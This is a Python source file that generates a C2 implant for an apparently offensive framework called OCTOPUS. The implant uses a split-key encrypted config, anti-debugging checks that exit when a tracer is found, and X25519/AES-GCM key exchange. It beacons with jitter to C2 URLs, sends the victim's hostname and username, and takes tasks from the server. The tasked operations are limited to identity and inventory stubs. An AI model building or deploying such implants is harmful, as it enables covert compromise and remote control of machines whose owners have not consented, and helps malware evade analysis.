"""Python closed-operation C2 agent generator.

Generates a self-contained Python implant with:
  - AES-GCM encrypted config (key split like Go implant)
  - X25519 + HKDF-SHA256 key exchange (matches crypto_engine.py)
  - HTTP beaconing with configurable jitter
  - Closed, typed identity and inventory operations
  - Anti-debugging checks (ptrace, timing, debugger detection)

The generated implant is a single Python string that can be written
to a .py file, base64-encoded for delivery, or embedded in a stager.

Security notes:
  - Config key is split into two parts (KP1, KP2), assembled at runtime
  - Plaintext config is wiped from memory after parsing
  - Session key never touches disk
  - All C2 traffic is AES-256-GCM encrypted with replay protection
"""

import base64
import json
import logging
import os
import secrets
import textwrap

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from core.c2.protocol import C2_SESSION_KDF_CONTEXT

logger = logging.getLogger("octopus.c2.implants.python")


def _encrypt_config(config: dict, key: bytes) -> str:
    """Encrypt implant config blob with AES-256-GCM.

    Matches the Go implant's simpleDecryptAESGCM format:
    nonce (12 bytes) || ciphertext || tag (16 bytes), base64-encoded.

    Args:
        config: Configuration dictionary to encrypt.
        key: 32-byte AES-256 key.

    Returns:
        Base64-encoded encrypted config string.
    """
    plaintext = json.dumps(config).encode("utf-8")
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    ciphertext_with_tag = aesgcm.encrypt(nonce, plaintext, None)

    # Format: [12 bytes nonce][ciphertext][16 bytes tag]
    blob = nonce + ciphertext_with_tag
    return base64.b64encode(blob).decode("ascii")


def _split_key(key: bytes) -> tuple:
    """Split a 32-byte key into two hex halves for obfuscation.

    Matches the Go implant's KP1/KP2 pattern where the full key
    is reconstructed at runtime by concatenating the hex parts.

    Args:
        key: 32-byte key to split.

    Returns:
        Tuple of (kp1_hex, kp2_hex) strings, each 32 hex chars.
    """
    hex_key = key.hex()
    midpoint = len(hex_key) // 2
    return hex_key[:midpoint], hex_key[midpoint:]


def generate_python_implant(
    c2_urls: list[str],
    beacon_interval: int = 60,
    jitter_percent: int = 20,
    server_pub_b64: str = "",
    enrollment_token: str = "",
) -> str:
    """Generate a complete Python closed-operation implant.

    Creates a self-contained Python script with encrypted configuration,
    X25519 key exchange, AES-GCM encrypted C2 communication, closed typed
    inventory handlers, and anti-debugging checks.

    The generated implant follows the same crypto protocol as the Go
    implant (implant.go) and communicates with the same C2 daemon
    (daemon.py).

    Args:
        c2_urls: List of C2 server URLs (e.g., ['https://c2.example.com:8443']).
                 The implant will try them in order as fallbacks.
        beacon_interval: Seconds between beacons. Defaults to 60.
        jitter_percent: Random jitter percentage (0-50). Defaults to 20.
        server_pub_b64: Base64-encoded server X25519 public key.
                        If empty, the configured local server public key is
                        loaded; missing/invalid key material fails generation.

    Returns:
        Complete Python implant source code as a string.

    Raises:
        ValueError: If c2_urls is empty or beacon_interval < 1.

    Example:
        >>> code = generate_python_implant(
        ...     c2_urls=["https://c2.example.com:8443"],
        ...     beacon_interval=30,
        ... )
        >>> "def beacon(" in code
        True
    """
    if not c2_urls:
        raise ValueError("At least one C2 URL is required")
    if beacon_interval < 1:
        raise ValueError(f"beacon_interval must be ≥ 1, got {beacon_interval}")
    if not 0 <= jitter_percent <= 50:
        raise ValueError(f"jitter_percent must be 0-50, got {jitter_percent}")

    if not server_pub_b64:
        from core.c2.builder import load_server_pub_key

        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
        server_pub_b64 = load_server_pub_key(os.path.join(base_dir, "data", "keys", "server_x25519_public.pem"))
    if len(base64.b64decode(server_pub_b64, validate=True)) != 32:
        raise ValueError("server_pub_b64 must contain a raw 32-byte X25519 key")
    if not enrollment_token:
        from core.c2.enrollment import EnrollmentAuthority

        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
        enrollment_token = EnrollmentAuthority(os.path.join(base_dir, "data", "keys", "enrollment.key")).issue()

    # Generate encryption key and split it
    config_key = secrets.token_bytes(32)
    kp1, kp2 = _split_key(config_key)

    # Build config blob
    config = {
        "urls": ",".join(c2_urls),
        "pub": server_pub_b64,
        "enrollment_token": enrollment_token,
    }
    enc_blob = _encrypt_config(config, config_key)

    logger.info(
        "Generated Python implant: %d C2 URLs, interval=%ds, jitter=%d%%", len(c2_urls), beacon_interval, jitter_percent
    )

    # Build the implant source code
    implant_code = textwrap.dedent(f'''\
        #!/usr/bin/env python3
        """OCTOPUS Agent — Generated Implant."""

        import base64
        import hashlib
        import json
        import logging
        import os
        import platform
        import random
        import socket
        import struct
        import sys
        import threading
        import time
        import ctypes
        import urllib.request
        import urllib.error
        import ssl

        # ─── Encrypted Config (split key, AES-GCM blob) ───────────────
        _ENC_BLOB = "{enc_blob}"
        _KP1 = "{kp1}"
        _KP2 = "{kp2}"
        _BEACON_INT = {beacon_interval}
        _JITTER_PCT = {jitter_percent}

        # ─── Runtime State ─────────────────────────────────────────────
        _agent_id = ""
        _session_key = None
        _tx_seq = 0
        _rx_seq = 0
        _c2_urls = []
        _server_pub = b""
        _enrollment_token = ""

        _V12_TASK_FIELDS = frozenset({{
            "schema_version",
            "task_id",
            "operation_id",
            "payload_schema_version",
            "result_schema_version",
            "expected_agent_capabilities_revision",
            "expected_agent_capabilities_digest",
            "expected_agent_artifact_binding_digest",
            "payload",
            "issued_at",
            "expires_at",
            "delivery_attempt",
        }})

        _CLOSED_OPERATION_SCHEMAS = {{
            "c2-operation://identity": (
                "c2-agent-payload/identity/1",
                "c2-agent-result/identity/1",
            ),
            "c2-operation://host-inventory": (
                "c2-agent-payload/host-inventory/1",
                "c2-agent-result/host-inventory/1",
            ),
            "c2-operation://network-inventory": (
                "c2-agent-payload/network-inventory/1",
                "c2-agent-result/network-inventory/1",
            ),
            "c2-operation://service-inventory": (
                "c2-agent-payload/service-inventory/1",
                "c2-agent-result/service-inventory/1",
            ),
        }}


        # ─── Anti-Debug ────────────────────────────────────────────────

        def _check_debugger() -> bool:
            """Check for common debugging indicators."""
            # Check for ptrace on Linux
            if sys.platform == "linux":
                try:
                    with open("/proc/self/status", "r") as f:
                        for line in f:
                            if line.startswith("TracerPid:"):
                                pid = int(line.split(":")[1].strip())
                                if pid != 0:
                                    return True
                except Exception as _exc:
                    logging.debug(f"Suppressed in python_implant.py: {{_exc}}")

            # Timing check: debuggers slow down execution
            start = time.monotonic()
            _ = sum(range(100000))
            elapsed = time.monotonic() - start
            if elapsed > 1.0:  # Should be < 0.01s normally
                return True

            # Check for common debugger environment variables
            debug_vars = ["PYTHONDEBUG", "PYDEVD_USE_FRAME_EVAL"]
            for var in debug_vars:
                if os.environ.get(var):
                    return True

            return False


        # ─── Crypto (matches C2 daemon crypto_engine.py) ───────────────

        def _simple_decrypt_aes_gcm(key: bytes, b64_blob: str) -> bytes:
            """Decrypt config blob (no sequence numbers)."""
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            data = base64.b64decode(b64_blob)
            nonce = data[:12]
            ciphertext = data[12:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(nonce, ciphertext, None)

        def _encrypt_aes_gcm(key: bytes, plaintext: bytes) -> str:
            """Encrypt with sequence number AAD (replay protection)."""
            global _tx_seq
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            _tx_seq += 1
            seq_bytes = struct.pack("<Q", _tx_seq)
            nonce = os.urandom(12)
            aesgcm = AESGCM(key)
            ct = aesgcm.encrypt(nonce, plaintext, seq_bytes)
            payload = seq_bytes + nonce + ct
            return base64.b64encode(payload).decode("ascii")

        def _decrypt_aes_gcm(key: bytes, b64_ct: str) -> bytes:
            """Decrypt with sequence number verification."""
            global _rx_seq
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            data = base64.b64decode(b64_ct)
            seq_bytes = data[:8]
            nonce = data[8:20]
            ciphertext = data[20:]
            rx = struct.unpack("<Q", seq_bytes)[0]
            if rx <= _rx_seq:
                raise ValueError("Replay detected")
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, seq_bytes)
            _rx_seq = rx
            return plaintext

        def _derive_shared_key(priv: bytes, peer_pub: bytes) -> bytes:
            """X25519 ECDH + HKDF-SHA256 key derivation."""
            from cryptography.hazmat.primitives.asymmetric import x25519
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.hkdf import HKDF
            priv_key = x25519.X25519PrivateKey.from_private_bytes(priv)
            peer_key = x25519.X25519PublicKey.from_public_bytes(peer_pub)
            raw_shared = priv_key.exchange(peer_key)
            session_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info={C2_SESSION_KDF_CONTEXT!r},
            ).derive(raw_shared)
            # Wipe raw shared key
            raw_mut = bytearray(raw_shared)
            for i in range(len(raw_mut)):
                raw_mut[i] = 0
            return session_key


        # ─── Config Init ──────────────────────────────────────────────

        def _init_config() -> bool:
            """Assemble split key, decrypt config, populate globals."""
            global _c2_urls, _server_pub, _enrollment_token
            try:
                hex_key = _KP1 + _KP2
                key = bytes.fromhex(hex_key)
                plaintext = _simple_decrypt_aes_gcm(key, _ENC_BLOB)
                conf = json.loads(plaintext)
                _c2_urls = conf["urls"].split(",")
                _server_pub = base64.b64decode(conf.get("pub", ""))
                _enrollment_token = conf.get("enrollment_token", "")
                if len(_server_pub) != 32 or not _enrollment_token:
                    return False
                # Wipe plaintext
                pt_mut = bytearray(plaintext)
                for i in range(len(pt_mut)):
                    pt_mut[i] = 0
                key_mut = bytearray(key)
                for i in range(len(key_mut)):
                    key_mut[i] = 0
                return True
            except Exception as e:
                return False


        # ─── Registration ─────────────────────────────────────────────

        def _register() -> bool:
            """Register with C2 via X25519 key exchange."""
            global _agent_id, _session_key
            from cryptography.hazmat.primitives.asymmetric import x25519
            from cryptography.hazmat.primitives import serialization

            # Generate ephemeral X25519 keypair
            priv_key = x25519.X25519PrivateKey.generate()
            pub_bytes = priv_key.public_key().public_bytes(
                serialization.Encoding.Raw,
                serialization.PublicFormat.Raw,
            )
            priv_bytes = priv_key.private_bytes(
                serialization.Encoding.Raw,
                serialization.PrivateFormat.Raw,
                serialization.NoEncryption(),
            )

            # Derive session key
            if len(_server_pub) != 32 or not _enrollment_token:
                return False
            _session_key = _derive_shared_key(priv_bytes, _server_pub)

            # Build registration data
            hostname = socket.gethostname()
            user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
            reg_data = json.dumps({{
                "hostname": hostname,
                "os": platform.system(),
                "user": user,
            }}).encode("utf-8")

            enc_data = _encrypt_aes_gcm(_session_key, reg_data)

            payload = json.dumps({{
                "client_pub": base64.b64encode(pub_bytes).decode(),
                "data": enc_data,
                "enrollment_token": _enrollment_token,
            }}).encode("utf-8")

            # Wipe private key
            priv_mut = bytearray(priv_bytes)
            for i in range(len(priv_mut)):
                priv_mut[i] = 0

            # Try each C2 URL
            ctx = ssl.create_default_context()

            for url in _c2_urls:
                try:
                    req = urllib.request.Request(
                        url.rstrip("/") + "/register",
                        data=payload,
                        headers={{"Content-Type": "application/json"}},
                    )
                    resp = urllib.request.urlopen(req, timeout=30, context=ctx)
                    resp_data = json.loads(resp.read())
                    if "data" in resp_data:
                        registration = json.loads(
                            _decrypt_aes_gcm(_session_key, resp_data["data"])
                        )
                        assigned_id = registration.get("agent_id", "")
                        if assigned_id.startswith("AGT-"):
                            _agent_id = assigned_id
                            return True
                except Exception as e:
                    continue
            return False


        # ─── Beacon Loop ──────────────────────────────────────────────

        def _beacon(results: list = None, acknowledgements: list = None) -> list:
            """Send beacon and receive tasks."""
            beacon_data = json.dumps({{
                "agent_id": _agent_id,
                "hostname": socket.gethostname(),
                "results": results or [],
                "acks": acknowledgements or [],
            }}).encode("utf-8")

            enc_data = _encrypt_aes_gcm(_session_key, beacon_data)
            payload = json.dumps({{"data": enc_data}}).encode("utf-8")

            ctx = ssl.create_default_context()

            for url in _c2_urls:
                try:
                    req = urllib.request.Request(
                        url.rstrip("/") + "/beacon",
                        data=payload,
                        headers={{
                            "Content-Type": "application/json",
                            "Agent-ID": _agent_id,
                        }},
                    )
                    resp = urllib.request.urlopen(req, timeout=30, context=ctx)
                    resp_data = json.loads(resp.read())
                    if "data" in resp_data:
                        dec = _decrypt_aes_gcm(_session_key, resp_data["data"])
                        tasks_data = json.loads(dec)
                        return tasks_data.get("tasks", [])
                except Exception as e:
                    continue
            return []


        # ─── Task Router ─────────────────────────────────────────────

        def _process_task(task: dict) -> dict:
            """Validate and route one closed V12 operation."""
            task_id = task.get("task_id", "")
            result = {{"task_id": task_id, "output": "", "error": ""}}

            if set(task) != _V12_TASK_FIELDS:
                result["error"] = "invalid_task: envelope fields mismatch"
                return result
            if task.get("schema_version") != "12.0" or not task_id:
                result["error"] = "invalid_task: schema or identity mismatch"
                return result

            op = task.get("operation_id", "")
            schemas = _CLOSED_OPERATION_SCHEMAS.get(op)
            if schemas is None:
                result["error"] = f"unsupported_operation: {{op}}"
                return result
            if (
                task.get("payload_schema_version") != schemas[0]
                or task.get("result_schema_version") != schemas[1]
            ):
                result["error"] = "invalid_task: operation schema mismatch"
                return result

            if op == "c2-operation://identity":
                info = {{
                    "schema_version": "c2-agent-result/identity/1",
                    "hostname": socket.gethostname(),
                    "os": platform.system().lower(),
                    "arch": platform.machine().lower(),
                    "user": os.environ.get("USER", os.environ.get("USERNAME", "")),
                    "process_id": os.getpid(),
                }}
                result["output"] = json.dumps(info)
            elif op == "c2-operation://host-inventory":
                result["output"] = json.dumps({{"schema_version": "c2-agent-result/host-inventory/1", "processes": [], "services": [], "truncated": False}})
            elif op == "c2-operation://network-inventory":
                result["output"] = json.dumps({{"schema_version": "c2-agent-result/network-inventory/1", "interfaces": [], "routes": [], "connections": [], "truncated": False}})
            elif op == "c2-operation://service-inventory":
                result["output"] = json.dumps({{"schema_version": "c2-agent-result/service-inventory/1", "services": [], "truncated": False}})

            return result


        # ─── Sleep with Jitter ────────────────────────────────────────

        def _sleep_with_jitter():
            """Sleep for beacon interval with random jitter."""
            jitter_range = _BEACON_INT * _JITTER_PCT // 100
            actual = _BEACON_INT + random.randint(-jitter_range, jitter_range)
            actual = max(actual, 1)
            time.sleep(actual)


        # ─── Main ────────────────────────────────────────────────────

        def main():
            # Anti-debug check
            if _check_debugger():
                sys.exit(0)

            # Initialize config
            if not _init_config():
                sys.exit(0)

            # Register with C2 (retry loop)
            while True:
                if _register():
                    break
                time.sleep(5 + random.randint(0, 5))

            # Main beacon loop
            pending_results = []
            while True:
                try:
                    tasks = _beacon(pending_results)
                    pending_results = []
                    if tasks:
                        ack_ids = [
                            task.get("task_id", "") for task in tasks
                            if task.get("task_id")
                        ]
                        additional = _beacon([], ack_ids)
                        known_ids = {{task.get("task_id") for task in tasks}}
                        tasks.extend(
                            task for task in additional
                            if task.get("task_id") not in known_ids
                        )
                    for task in tasks:
                        result = _process_task(task)
                        pending_results.append(result)
                except Exception as _exc:
                    logging.debug(f"Suppressed in python_implant.py: {{_exc}}")
                _sleep_with_jitter()


        if __name__ == "__main__":
            main()
    ''')

    return implant_code
